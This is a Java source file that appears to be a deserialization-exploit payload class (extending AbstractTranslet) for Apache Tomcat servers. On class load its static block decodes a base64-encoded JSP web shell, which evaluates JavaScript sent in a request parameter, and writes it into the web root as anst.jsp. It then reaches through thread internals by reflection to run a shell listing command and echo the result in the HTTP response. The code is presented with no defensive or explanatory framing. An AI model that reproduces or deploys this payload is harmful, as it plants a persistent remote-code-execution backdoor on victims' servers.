package com.example.frchannel.payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;

public class antsword extends AbstractTranslet {

    private static String antsword = "PCUKICAgICBuZXcgamF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZU1hbmFnZXIoKS5nZXRFbmdpbmVCeU5hbWUoImpzIikuZXZhbChyZXF1ZXN0LmdldFBhcmFtZXRlcigiYiIpLCBuZXcgamF2YXguc2NyaXB0LlNpbXBsZUJpbmRpbmdzKG5ldyBqYXZhLnV0aWwuSGFzaE1hcCgpIHt7CiAgICAgICAgICAgIHB1dCgicmVzcG9uc2UiLCByZXNwb25zZSk7CiAgICAgICAgICAgIHB1dCgicmVxdWVzdCIsIHJlcXVlc3QpOwogICAgICAgIH19KSk7CiU+";
    private static String fname = "anst.jsp";
    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }
    public static void exec () throws Exception{
        String path = "";
        byte[] decode = Base64.getDecoder().decode(antsword);
        if (File.separator.equals("/")) {
            path = "../webapps/webroot/";
        } else {
            path = "..\\webapps\\webroot\\";
        }
        FileOutputStream fileOutputStream = new FileOutputStream(path+fname);
        fileOutputStream.write(decode);
        fileOutputStream.close();

        boolean var1 = false;
        Thread[] var2 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads"));
        for(int var3 = 0; var3 < var2.length; ++var3) {
            Thread var4 = var2[var3];
            if (var4 != null) {
                String var5 = var4.getName();
                if (!var5.contains("exec") && var5.contains("http")) {
                    Object var6 = getFV(var4, "target");
                    if (var6 instanceof Runnable) {
                        try {
                            var6 = getFV(getFV(getFV(var6, "this$0"), "handler"), "global");
                        } catch (Exception var14) {
                            continue;
                        }

                        List var8 = (List)getFV(var6, "processors");

                        for(int var9 = 0; var9 < var8.size(); ++var9) {
                            Object var10 = var8.get(var9);
                            var6 = getFV(var10, "req");
                            Object var11 = var6.getClass().getMethod("getResponse").invoke(var6);

                            try {
                                var5 = (String)var6.getClass().getMethod("getHeader", String.class).invoke(var6, new String("host"));
                                if (var5 != null && !var5.isEmpty()) {
                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", "dir "+path} : new String[]{"/bin/sh", "-c", "ls "+path};
                                    writeBody(var11, (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                                    var1 = true;
                                }

                                if (var1) {
                                    break;
                                }
                            } catch (Exception var13) {
                                Exception var14 = var13;
                                writeBody(var11, var14.getMessage().getBytes());
                            }
                        }

                        if (var1) {
                            break;
                        }
                    }
                }
            }
        }

    }

    static {
        try {
            exec();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static String[] splitString(String originalString, int chunkSize) {
        int length = originalString.length();
        int numChunks = (int) Math.ceil((double) length / chunkSize);
        String[] chunks = new String[numChunks];

        for (int i = 0; i < numChunks; i++) {
            int startIndex = i * chunkSize;
            int endIndex = Math.min(startIndex + chunkSize, length);
            chunks[i] = originalString.substring(startIndex, endIndex);
        }

        return chunks;
    }

    public static void writeToSingleFile(String fileName, String[] chunks) {
        try (FileWriter writer = new FileWriter(fileName)) {
            int num = 1;
            for (String chunk : chunks) {
                writer.write("private static String code" + num + " = \"" + chunk + "\";\n");
                num++;
            }
            System.out.println("All chunks have been written to " + fileName);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static void writeBody(Object var0, byte[] var1) throws Exception {
        byte[] var2 = var1;

        Object var3;
        Class var4;
        try {
            var4 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var3 = var4.newInstance();
            var4.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var3, var2, new Integer(0), new Integer(var2.length));
            var0.getClass().getMethod("doWrite", var4).invoke(var0, var3);
        } catch (Exception var6) {
            var4 = Class.forName("java.nio.ByteBuffer");
            var3 = var4.getDeclaredMethod("wrap", byte[].class).invoke(var4, var1);
            var0.getClass().getMethod("doWrite", var4).invoke(var0, var3);
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
